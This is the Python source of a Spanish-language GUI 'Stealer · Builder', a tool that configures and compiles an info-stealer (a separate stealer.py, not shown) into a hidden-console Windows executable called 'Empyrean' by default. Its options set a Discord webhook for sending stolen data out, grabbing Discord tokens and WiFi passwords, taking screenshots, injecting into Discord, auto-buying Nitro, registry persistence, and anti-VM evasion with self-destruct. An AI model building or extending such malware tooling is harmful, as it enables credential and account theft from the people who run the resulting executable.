"""
Constructor del .exe · interfaz simple
Escribe _config.py, instala dependencias y compila con PyInstaller.
"""

import os
import queue
import shutil
import subprocess
import sys
import tempfile
import threading
import traceback
from pathlib import Path

import tkinter as tk
from tkinter import filedialog, messagebox

BASE = Path(__file__).parent.resolve()
CONFIG = BASE / "_config.py"
STEALER = BASE / "stealer.py"
REQS = BASE / "requirements.txt"

DEPENDENCIAS = "requests\npycryptodome\npillow\nwebsocket-client\npyinstaller\n"

C = {
    "fondo":  "#12121a",
    "panel":  "#1c1c26",
    "campo":  "#0e0e14",
    "texto":  "#e8e8f0",
    "suave":  "#8a8a9e",
    "acento": "#7c5cff",
}


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealer · Builder")
        self.configure(bg=C["fondo"])
        self.geometry("660x720")
        self.resizable(False, False)

        self.cola = queue.Queue()
        self.ocupado = False

        self._ui()
        self.after(100, self._bucle)

    # ---------------------------------------------------------------
    def _ui(self):
        tk.Label(self, text="STEALER · BUILDER", bg=C["fondo"], fg=C["acento"],
                 font=("Segoe UI", 15, "bold")).pack(anchor="w", padx=18, pady=(16, 2))
        tk.Label(self, text="Configura y compila tu .exe", bg=C["fondo"],
                 fg=C["suave"], font=("Segoe UI", 9)).pack(anchor="w", padx=18)

        caja = tk.Frame(self, bg=C["panel"])
        caja.pack(fill="x", padx=18, pady=14)

        self.webhook = self._campo(caja, "Webhook de Discord", "")
        self.nombre = self._campo(caja, "Nombre del .exe", "Empyrean")
        self.icono = self._campo(caja, "Icono (.ico, opcional)", "", boton=True)
        self.webhook_key = self._campo(caja, "Webhook protector key (opcional)", "")

        self.v_captura = tk.BooleanVar(value=True)
        self.v_wifi = tk.BooleanVar(value=True)
        self.v_discord = tk.BooleanVar(value=True)
        self.v_inyectar = tk.BooleanVar(value=True)
        self.v_nitro = tk.BooleanVar(value=False)
        self.v_ping = tk.BooleanVar(value=False)
        self.v_persist = tk.BooleanVar(value=True)
        self.v_antivm = tk.BooleanVar(value=True)
        self.v_sdest = tk.BooleanVar(value=False)

        self._grupo(caja, "Navegadores", (
            ("Captura de pantalla", self.v_captura),
            ("Claves WiFi", self.v_wifi),
            ("Tokens de Discord", self.v_discord)))
        self._grupo(caja, "Discord", (
            ("Inyectar en Discord", self.v_inyectar),
            ("Auto-buy Nitro", self.v_nitro),
            ("Ping @here", self.v_ping)))
        self._grupo(caja, "Sistema", (
            ("Persistencia en el registro", self.v_persist),
            ("Anti-VM", self.v_antivm),
            ("Self-destruct en VM", self.v_sdest)), ultimo=True)

        botones = tk.Frame(self, bg=C["fondo"])
        botones.pack(fill="x", padx=18)

        self.b_build = self._boton(botones, "CONSTRUIR .EXE", C["acento"], self.construir)
        self.b_build.pack(side="left")
        self.b_test = self._boton(botones, "Probar", C["panel"], self.probar)
        self.b_test.pack(side="left", padx=8)
        self._boton(botones, "Abrir dist", C["panel"], self.abrir_dist).pack(side="left")
        self._boton(botones, "Limpiar", C["panel"], self.limpiar).pack(side="left", padx=8)

        self.estado = tk.Label(self, text="Listo", bg=C["fondo"], fg=C["suave"],
                               font=("Segoe UI", 9))
        self.estado.pack(anchor="w", padx=18, pady=(10, 4))

        self.log = tk.Text(self, bg=C["campo"], fg=C["texto"], bd=0,
                           font=("Consolas", 9), wrap="word")
        self.log.pack(fill="both", expand=True, padx=18, pady=(0, 16))

    def _campo(self, padre, etiqueta, valor, boton=False):
        tk.Label(padre, text=etiqueta, bg=C["panel"], fg=C["suave"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=14, pady=(10, 2))
        fila = tk.Frame(padre, bg=C["panel"])
        fila.pack(fill="x", padx=14)
        entrada = tk.Entry(fila, bg=C["campo"], fg=C["texto"], insertbackground=C["texto"],
                           bd=0, font=("Segoe UI", 9), relief="flat")
        entrada.insert(0, valor)
        entrada.pack(side="left", fill="x", expand=True, ipady=6)
        if boton:
            tk.Button(fila, text="...", command=lambda: self.elegir_icono(entrada),
                      bg=C["panel"], fg=C["texto"], bd=0, font=("Segoe UI", 9),
                      activebackground=C["acento"]).pack(side="left", padx=(6, 0))
        return entrada

    def _grupo(self, padre, titulo, pares, ultimo=False):
        tk.Label(padre, text=titulo, bg=C["panel"], fg=C["acento"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=14, pady=(10, 2))
        fila = tk.Frame(padre, bg=C["panel"])
        fila.pack(fill="x", padx=14, pady=(0, 12 if ultimo else 0))
        for texto, var in pares:
            tk.Checkbutton(fila, text=texto, variable=var, bg=C["panel"],
                           fg=C["texto"], selectcolor=C["campo"],
                           activebackground=C["panel"], activeforeground=C["texto"],
                           font=("Segoe UI", 9), bd=0,
                           highlightthickness=0).pack(side="left", padx=(0, 14))

    def _boton(self, padre, texto, color, cmd):
        return tk.Button(padre, text=texto, command=cmd, bg=color, fg=C["texto"],
                         bd=0, font=("Segoe UI", 9, "bold"), padx=14, pady=7,
                         activebackground=C["acento"], activeforeground=C["texto"])

    # ---------------------------------------------------------------
    def elegir_icono(self, entrada):
        ruta = filedialog.askopenfilename(filetypes=[("Icono", "*.ico")])
        if ruta:
            entrada.delete(0, "end")
            entrada.insert(0, ruta)

    def escribir(self, texto):
        self.log.insert("end", texto + "\n")
        self.log.see("end")

    def _bucle(self):
        try:
            while True:
                clase, dato = self.cola.get_nowait()
                if clase == "log":
                    self.escribir(dato)
                elif clase == "estado":
                    self.estado.config(text=dato)
                elif clase == "fin":
                    self._terminar()
        except queue.Empty:
            pass
        self.after(100, self._bucle)

    def _terminar(self):
        self.ocupado = False
        self.b_build.config(state="normal")
        self.b_test.config(state="normal")
        self.estado.config(text="Listo")

    # ---------------------------------------------------------------
    def _instantanea(self):
        return {
            "webhook": self.webhook.get().strip(),
            "nombre": self.nombre.get().strip() or "Empyrean",
            "icono": self.icono.get().strip(),
            "webhook_key": self.webhook_key.get().strip(),
            "persistencia": self.v_persist.get(),
            "captura": self.v_captura.get(),
            "discord": self.v_discord.get(),
            "wifi": self.v_wifi.get(),
            "inyectar": self.v_inyectar.get(),
            "nitro": self.v_nitro.get(),
            "ping": self.v_ping.get(),
            "antivm": self.v_antivm.get(),
            "sdest": self.v_sdest.get(),
        }

    def generar_config(self, c):
        CONFIG.write_text(
            "# generado por builder.py\n"
            f"WEBHOOK = {c['webhook']!r}\n"
            f"NOMBRE = {c['nombre']!r}\n"
            f"PERSISTENCIA = {c['persistencia']}\n"
            f"CAPTURA = {c['captura']}\n"
            f"ROBAR_DISCORD = {c['discord']}\n"
            f"ROBAR_WIFI = {c['wifi']}\n"
            f"VALIDAR_TOKENS = True\n"
            f"INYECTAR = {c['inyectar']}\n"
            f"AUTO_NITRO = {c['nitro']}\n"
            f"PING_ON_RUN = {c['ping']}\n"
            f"ANTI_VM = {c['antivm']}\n"
            f"SELF_DESTRUCT = {c['sdest']}\n"
            f"WEBHOOK_KEY = {c['webhook_key']!r}\n"
            f"ICONO = 'https://i.imgur.com/ihzoAWl.jpeg'\n",
            encoding="utf-8")

    # ---------------------------------------------------------------
    def correr(self, cmd, cwd=None):
        self.cola.put(("log", f"$ {' '.join(str(x) for x in cmd)}"))
        p = subprocess.Popen(cmd, cwd=str(cwd or BASE), stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             creationflags=0x08000000 if sys.platform == "win32" else 0)
        for linea in p.stdout:
            self.cola.put(("log", linea.rstrip()))
        return p.wait()

    def validar(self):
        if not STEALER.exists():
            messagebox.showerror("Falta stealer.py",
                                 f"No encuentro {STEALER.name} junto al builder.")
            return False
        if not REQS.exists():
            REQS.write_text(DEPENDENCIAS, encoding="utf-8")
        webhook = self.webhook.get().strip()
        if not webhook.startswith("http"):
            return bool(messagebox.askyesno("Webhook",
                                            "El webhook parece vacio o invalido. Continuar?"))
        return True

    def tarea(self, cfg, solo_probar):
        try:
            self.cola.put(("log", "instalando dependencias..."))
            self.correr([sys.executable, "-m", "pip", "install", "-q", "-r", str(REQS)])
            self.correr([sys.executable, "-m", "pip", "install", "-q", "pyinstaller"])

            self.cola.put(("estado", "Compilando..."))
            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm", "--clean",
                   "--onefile", "--noconsole", "--name", cfg["nombre"]]
            if cfg["icono"] and Path(cfg["icono"]).exists():
                cmd += ["--icon", cfg["icono"]]
            cmd.append(str(STEALER))

            codigo = self.correr(cmd)
            if codigo != 0:
                self.cola.put(("log", f"compilacion fallida (codigo {codigo})"))
                return

            exe = BASE / "dist" / f"{cfg['nombre']}.exe"
            self.cola.put(("log", f"LISTO -> {exe}"))
            if solo_probar and exe.exists():
                self.cola.put(("log", "ejecutando prueba..."))
                subprocess.Popen([str(exe)], cwd=str(BASE))
        except Exception:
            self.cola.put(("log", traceback.format_exc()))
        finally:
            self.cola.put(("fin", None))

    def lanzar(self, solo_probar):
        if self.ocupado or not self.validar():
            return

        cfg = self._instantanea()
        self.generar_config(cfg)

        self.ocupado = True
        self.b_build.config(state="disabled")
        self.b_test.config(state="disabled")
        self.estado.config(text="Instalando..." if solo_probar else "Preparando...")
        self.escribir("config escrita en _config.py")

        threading.Thread(target=self.tarea, args=(cfg, solo_probar), daemon=True).start()

    def construir(self):
        self.lanzar(False)

    def probar(self):
        self.lanzar(True)

    def abrir_dist(self):
        ruta = BASE / "dist"
        ruta.mkdir(exist_ok=True)
        subprocess.Popen(["explorer", str(ruta)])

    def limpiar(self):
        borrados = 0
        for nombre in ("build", "dist", "__pycache__"):
            ruta = BASE / nombre
            if ruta.exists():
                shutil.rmtree(ruta, ignore_errors=True)
                borrados += 1
        for spec in BASE.glob("*.spec"):
            try:
                spec.unlink()
                borrados += 1
            except Exception:
                pass
        self.escribir(f"limpiado ({borrados} elementos)")


if __name__ == "__main__":
    try:
        App().mainloop()
    except Exception:
        texto = traceback.format_exc()
        try:
            ruta = Path(tempfile.gettempdir()) / "builder_error.txt"
            ruta.write_text(texto, encoding="utf-8")
        except Exception:
            pass
        try:
            messagebox.showerror("Builder", f"Error al iniciar:\n\n{texto}")
        except Exception:
            pass